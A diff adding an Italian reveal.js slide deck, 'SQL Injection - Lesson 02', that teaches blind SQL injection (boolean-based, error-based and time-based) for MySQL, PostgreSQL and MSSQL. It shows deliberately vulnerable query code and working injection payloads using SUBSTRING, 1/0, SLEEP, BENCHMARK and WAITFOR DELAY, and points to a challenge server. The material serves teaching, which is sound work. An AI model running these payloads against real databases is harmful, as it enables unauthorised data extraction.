@@ -1,0 +1,650 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<title>SQL Injection - Lesson 02 - coppito_zero_day</title>
+
+		<link rel="stylesheet" href="css/reset.css">
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/coppito-zero-day.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="lib/css/monokai.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+	</head>
+	<body>
+		<div class="reveal">
+			<div class="slides">
+				<section>
+					<h2>SQL Injection</h2>
+					<h4>LESSON 02</h4>
+				</section>
+				<section>
+					<h2>'BLIND SQL INJECTION</h2>
+					<p>Cosa vuol dire BLIND SQL INJECTION?</p>
+					<p>&nbsp;</p>
+					<p class="fragment fade">
+						Una BLIND SQL INJECTION è una tecnica di SQLi che ci permette di estrarre
+						informazioni dal DB senza utilizzare i messaggi di errore verbosi o
+						la concatenazione di dati.
+					</p>
+				</section>
+				<section>
+					<h2>'BLIND SQL INJECTION</h2>
+					<p>Scenari ricorrenti:</p>
+					<ul>
+						<li class="fragment fade">Viene restituito un errore generico (non
+							sono visibili i messaggi di errore SQL) e possiamo controllare
+							l'output in qualche modo (senza poter iniettare direttamente
+							valori).</li>
+						<li class="fragment fade">Viene restituito un errore generico (non
+							sono visibili i messaggi di errore SQL), ma non possiamo controllare
+							l'output in nessun modo.</li>
+						<li class="fragment fade">Non vengono restituiti messaggi di errore
+							e non possiamo controllare l'output in nessun modo.</li>
+					</ul>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<p>Si utilizza quando non possiamo controllare direttamente
+						l'output con valori arbitrari, ma possiamo comunque osservare
+						nei cambiamenti nella risposta.<br />
+						L'idea è quella di iniettare un ramo condizionale nella query e osservare
+						quando la risposta cambia.
+					</p>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs js" data-trim>
+connection.query("SELECT COUNT(id) FROM pages WHERE status = '" + req.body.status + "'",
+  function(error, result) {
+    if (error) {
+      console.log("Generic error");
+    } else {
+      console.log("There are " + result + "pages.");
+    }
+  }
+);
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+								status = "'"; // Generic Error
+								status = "published"; // Default behaviour, outputs "There are 15 pages"
+							</code>
+							</pre>
+					</div>
+					<div class="fragment fade">
+						<p>Non possiamo usare una UNION poichè viene restituito il numero di pagine.</p>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<small>Possiamo osservare i cambiamenti nella response.<br />
+						Se aggiungiamo una condizione <code>WHERE</code> sempre <code>false</code> possiamo essere
+						sicuri che l'output sarà sempre <code>There are 0 pages</code>.
+					</small>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+								status = "published' AND 1=0 -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published' AND 1=0 -- -' # Always FALSE
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Response:</small>
+						<pre>
+							<code class="hljs" data-trim>
+There are 0 pages
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<small>Per sfruttare una <code>BOOLEAN BASED INJECTION</code> possiamo
+						inserire una condizione che ci permetta di dedurre delle informazioni.
+					</small>
+					<br />
+					<br />
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+status = "published' AND SUBSTRING(database(), 1, 1) = 'a' -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 1, 1) = 'a' -- -' # True if database first letter is 'a'
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<small>Assumiamo che il nome del database sia "web".
+					</small>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 1, 1) = 'a' -- -' # False
+
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 1, 1) = 'b' -- -' # False
+...
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 1, 1) = 'w' -- -' # True
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						Possiamo dedurre il risultato della condizione (<code>True</code>
+						/<code>False</code>) dalla response che mostrerà <code>There are 15
+						pages</code> per <code>True</code> e <code>There are 0 pages</code>
+						per <code>False</code>.
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Get all chars</h4>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 1, 1) = 'w' -- -' # True
+
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 2, 1) = 'e' -- -' # True
+
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND SUBSTRING(database(), 3, 1) = 'b' -- -' # True
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Get the end of strings</h4>
+					<div class="fragment fade">
+						<code>SUBSTRING</code> non ci da informazioni sulla fine della stringa.<br />
+						Possiamo usare <code>LENGTH</code>.<br /><br />
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+status = "published' AND LENGTH(database()) = 1 -- -
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages
+WHERE status = 'published' AND LENGTH(database()) = 1 -- - # False
+
+SELECT COUNT(id) FROM pages
+WHERE status = 'published' AND LENGTH(database()) = 2 -- - # False
+
+SELECT COUNT(id) FROM pages
+WHERE status = 'published' AND LENGTH(database()) = 3 -- - # True
+							</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Speed up</h4>
+					<div class="fragment fade">
+						<small>
+						In questo modo dobbiamo testare tutti i caratteri e questo non è
+						efficiente.<br />Poichè un byte può contenere 256 valori possiamo
+						usare la binary search e dedurre il valore di un byte in 8 richieste:
+						</small>
+					</div>
+					<div class="fragment fade">
+						<small>Assumendo che il nostro valore è 119:</small>
+						<ol>
+							<li class="fragment fade">
+Is the byte greater than 127? No, because 119 < 127.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 63? Yes, because 119 > 63.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 95? Yes, because 119 > 95.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 111? Yes, because 119 > 111.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 119? No, because 119 = 119.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 115? Yes, because 119 > 115.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 117? Yes, because 119 > 117.
+							</li>
+							<li class="fragment fade">
+Is the byte greater than 118? Yes, because 119 > 118.
+							</li>
+						</ol>
+					</div>
+				</section>
+				<section>
+					<h2>'BOOLEAN BASED INJECTION</h2>
+					<h4>Speed up</h4>
+					<small>La funzione <code>ASCII</code> viene in aiuto.</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND ASCII(SUBSTRING(database(), 1, 1)) > 127 -- -' # False
+
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND ASCII(SUBSTRING(database(), 1, 1)) > 63 -- -' # True
+...
+
+SELECT COUNT(id) FROM pages WHERE status = 'published'
+AND ASCII(SUBSTRING(database(), 1, 1)) > 118 -- -' # True
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						Svantaggio: le query devono susseguirsi.<br /></br>
+							Possiamo usare l'approccio "bit-to-bit" che ci permette di fare
+							8 richieste in parallelo.
+					</div>
+				</section>
+				<section>
+					<h2>'BLIND ERROR BASED INJECTION</h2>
+					<p>Si utilizza quando non possiamo controllare l'output, ma possiamo
+						comunque osservare degli errori generici quando la sintassi non è corretta.<br /></br>
+						L'idea è quella di iniettare un ramo condizionale nella query (come per <code>BOOLEAN BASED</code>)
+						e osservare quando riceviamo un errore.
+					</p>
+				</section>
+				<section>
+					<h2>CONDITIONAL EXPRESSIONS IN PostgreSQL e MSSQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT
+  CASE
+    WHEN 127 > 2 THEN 'YES'
+    ELSE 'NO'
+  END
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						La prima espression <code>127 < 2</code> viene valutata e, quando vero, questa SELECT torna <code>YES</code> oppure <code>NO</code>.
+					</div>
+				</section>
+				<section>
+					<h2>CONDITIONAL EXPRESSIONS IN MySQL</h2>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT
+  IF (
+    127 > 2,
+    'YES',
+    'NO'
+  )
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						La prima espressione <code>127 < 2</code> viene valutata e, quando vero, questa SELECT torna <code>YES</code> oppure <code>NO</code>.
+					</div>
+				</section>
+				<section>
+					<h2>'BLIND ERROR BASED EXAMPLE</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs ruby" data-trim>
+require 'pg'
+conn = PG.connect(:dbname => 'web', :user => 'user', :password => 'password')
+begin
+  res  = conn.exec("SELECT COUNT(id) FROM pages WHERE status = '#{params[:status]}'")
+  puts "Query executed"
+rescue PG::Error => err
+  puts "Generic error"
+end
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small class="fragment fade">Obiettivo: iniettare un ramo condizionale <code>CASE</code>.</small>
+						<small class="fragment fade">Per riconoscere la nostra condizione dobbiamo provocare un errore SQL mantenendo una sintassi corretta.</small>
+						<small class="fragment fade">In PostegreSQL <code>1/0</code> ha una sintassi corretta ma produce un errore <code>Division by zero</code>.</small>
+						<small class="fragment fade">In Mysql possiamo usare una subquery che torna righe multiple in un confronto:
+							<code>SELECT * FROM news WHERE id = (SELECT table_name FROM information_schema.columns)</code>.
+						</small>
+					</div>
+				</section>
+				<section>
+					<h2>'BLIND ERROR BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<small>Dobbiamo iniettare questo SQL:</small>
+					<div class="fragment fade">
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT
+  CASE
+    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
+    THEN (1/0)
+    ELSE 1
+  END
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<p>
+							per controllare che la prima lettera di <code>current_database()</code> sia una <code>a</code>.<br />
+								Per aggiungere questa query a quella vulnerabile possiamo usare <code>UNION</code>.<br />
+						</p>
+					</div>
+				</section>
+				<section>
+					<h2>'BLIND ERROR BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+status = "' UNION ALL SELECT
+	CASE WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
+	THEN (1/0) ELSE 1 END; -- -"
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = ''
+UNION ALL
+SELECT
+  CASE
+    WHEN (SUBSTRING(current_database(), 1, 1) = 'a')
+    THEN (1/0)
+    ELSE 1
+  END -- -'
+								</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+							Se la prima lettera di <code>current_database()</code> è una <code>a</code>, verrà eseguito <code>1/0</code> e ne scaturirà un errore.
+					</div>
+				</section>
+				<section>
+					<h2>'BLIND ERROR BASED INJECTION</h2>
+					<h4>Esempio</h4>
+					<div class="fragment fade">
+						<small>Come visto prima possiamo utilizzare la binary search o 'bit-to-bit' per ottenere ogni byte in 8 richieste<br /><br /></small>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs js" data-trim>
+status = "' UNION ALL SELECT
+	CASE WHEN (ASCII(SUBSTRING(current_database(), 1, 2)) > 127)
+	THEN (1/0) ELSE 1 END; -- -"
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = ''
+UNION ALL
+SELECT
+  CASE
+    WHEN (ASCII(SUBSTRING(current_database(), 1, 2)) > 127)
+    THEN (1/0)
+    ELSE 1
+  END
+								</code>
+						</pre>
+					</div>
+				</section>
+				<section>
+					<h2>'TIME BASED INJECTION</h2>
+					<p>Si utilizza quando non abbiamo alcun controllo sull'output.<br /></br>
+						L'idea è quella di iniettare un ramo condizionale che introduca un ritardo nell'esecuzione della query quando vera (o falsa).<br /><br />
+						Misurando il tempo di risposta possiamo sapere se la condizione è vera o falsa.
+					</p>
+				</section>
+				<section>
+					<h2>DELAY IN MySQL</h2>
+					<div class="fragment fade">
+						<code>SLEEP</code> mette in pausa la query per un numero fisso di secondi.<br />
+						<code>SLEEP(480.001)</code> mette in pausa la query per <code>480.001</code> secondi.
+					</div>
+					<br />
+					<div class="fragment fade">
+						<code>BENCHMARK(N, expression)</code> esegue <code>expression</code> per <code>N</code> volte.<br />
+						<code>BENCHMARK(480000, RAND())</code> esegue l'istruzione <code>RAND()</code> per <code>480000</code> volte.
+					</div>
+					<br />
+					<div class="fragment fade">
+						La principale differenza tra <code>SLEEP</code> e <code>BENCHMARK</code> è che <code>SLEEP</code>
+						introduce un tempo fisso che possiamo controllare, mentre <code>BENCHMARK</code> introduce un ritardo variabile che dipende da altri fattori.
+					</div>
+				</section>
+				<section>
+					<h2>'TIME BASED EXAMPLE (MySQL)</h2>
+						<div class="fragment fade">
+						<pre>
+							<code class="hljs python" data-trim>
+def count_pages(status):
+  with connection.cursor() as cursor:
+    cursor.execute("""SELECT COUNT(id) FROM pages WHERE status = '%s'""" % status)
+    result = cursor.fetchone()
+    update_pages_count(result[0]) # This function does not produce output
+    return 'ok'
+);
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs python" data-trim>
+status = "' UNION SELECT IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, SLEEP(5), 1) -- -"
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = ''
+UNION SELECT IF (
+  ASCII(SUBSTRING(database(), 1, 1)) > 127,
+  SLEEP(5),
+  1
+) -- -'
+								</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Se la condizione è vera la query verrà messa in pausa per 5 secondi <code>SLEEP(5)</code>, altrimenti torna immediatamente 1.</small>
+					</div>
+				</section>
+				<section>
+					<h2>'TIME BASED EXAMPLE (MySQL)</h2>
+						<div class="fragment fade">
+						<pre>
+							<code class="hljs python" data-trim>
+def count_pages(status):
+  with connection.cursor() as cursor:
+    cursor.execute("""SELECT COUNT(id) FROM pages WHERE status = '%s'""" % status)
+    result = cursor.fetchone()
+    update_pages_count(result[0]) # This function does not produce output
+    return 'ok'
+);
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs python" data-trim>
+status = "' UNION SELECT
+	IF (ASCII(SUBSTRING(database(), 1, 1)) > 127, BENCHMARK(480000, RAND()), 1) -- -"
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = ''
+UNION SELECT IF (
+  ASCII(SUBSTRING(database(), 1, 1)) > 127,
+  BENCHMARK(480000, RAND()),
+  1
+) -- -'
+								</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Se la condizione è vera la query verrà eseguito <code>RAND()</code> 480000 volte, introducento un ritardo, altrimenti torna immediatamente 1.</small>
+					</div>
+				</section>
+				<section>
+					<h2>DELAY IN MSSQL</h2>
+					<div class="fragment fade">
+						<code>WAITFOR()</code> mette in pausa una query.<br />
+						<code>WAITFOR 15:00</code> mette in pausa la query fino alle ore <code>15:00</code>.
+						<code>WAITFOR DELAY '00:00:05'</code> mette in pausa la query per <code>5</code> secondi (<code>DELAY</code> ci permette di specificare un tempo relativo).
+					</div>
+					<br />
+					<div class="fragment fade">
+						La principale differenza tra <code>WAITFOR</code> e <code>BENCHMARK</code> o <code>SLEEP</code>
+						è che <code>WAITFOR</code> non può essere usata in una subquery.<br />
+						Ma siamo su MSSQL e possiamo usare le <code>STACKED QUERIES</code>. Whoa!
+					</div>
+				</section>
+				<section>
+					<h2>'TIME BASED EXAMPLE (MSSQL)</h2>
+						<div class="fragment fade">
+						<pre>
+							<code class="hljs python" data-trim>
+def count_pages(status):
+  with connection.cursor() as cursor:
+    cursor.execute("""SELECT COUNT(id) FROM pages WHERE status = '%s'""" % status)
+    result = cursor.fetchone()
+    update_pages_count(result[0]) # This function does not produce output
+    return 'ok'
+);
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Valore in input:</small>
+						<pre>
+							<code class="hljs python" data-trim>
+status = "published'; IF (ASCII(SUBSTRING(database(), 1, 1)) > 127)) WAITFOR DELAY '00:00:05' -- -";
+							</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>Risultato:</small>
+						<pre>
+							<code class="hljs sql" data-trim>
+SELECT COUNT(id) FROM pages WHERE status = 'published';
+IF (ASCII(SUBSTRING(database(), 1, 1)) > 127)) WAITFOR DELAY '00:00:05' -- -";
+								</code>
+						</pre>
+					</div>
+					<div class="fragment fade">
+						<small>La prima query viene eseguita normalmente.</small>
+						<small>Nella seconda, se la condizione è vera la query verrà messa in pausa per 5 secondi (<code>WAITFOR DELAY '00:00:05'</code>).</small>
+					</div>
+				</section>
+				<section>
+					<h2>TIME BASED (EXTRA)</h2>
+					<p>
+						Nel mondo reale il tempo di esecuzione di una query dipende da molti fattori.<br />Come possiamo essere sicuri di intercettare il ritardo introdotto da noi?
+					</p>
+					<p class="fragment fade">Soluzioni:</p>
+					<ul>
+						<li class="fragment fade">Introduciamo un tempo sufficientemente lungo da escludere l'influenza di altri fattori (attenzione ai timeout).</li>
+						<li class="fragment fade">Inviamo due query nello stesso momento con condizioni invertite: la prima che torna non ha introdotto ritardo.</li>
+					</ul>
+				</section>
+				<section>
+					<h2>TOOL</h2>
+				</section>
+				<section>
+					<h2>CHALLENGE</h2>
+					<h4>http://167.172.164.187:8001/lesson-02/</h4>
+				</section>
+			</div>
+		</div>
+
+		<script src="js/reveal.js"></script>
+
+		<script>
+			// More info about config & dependencies:
+			// - https://github.com/hakimel/reveal.js#configuration
+			// - https://github.com/hakimel/reveal.js#dependencies
+			Reveal.initialize({
+				dependencies: [
+					{ src: 'plugin/markdown/marked.js' },
+					{ src: 'plugin/markdown/markdown.js' },
+					{ src: 'plugin/notes/notes.js', async: true },
+					{ src: 'plugin/highlight/highlight.js', async: true }
+				],
+				slideNumber: false,
+				width: 1600,
+				hash: true,
+				pdfSeparateFragments: false
+			});
+		</script>
+	</body>
+</html>
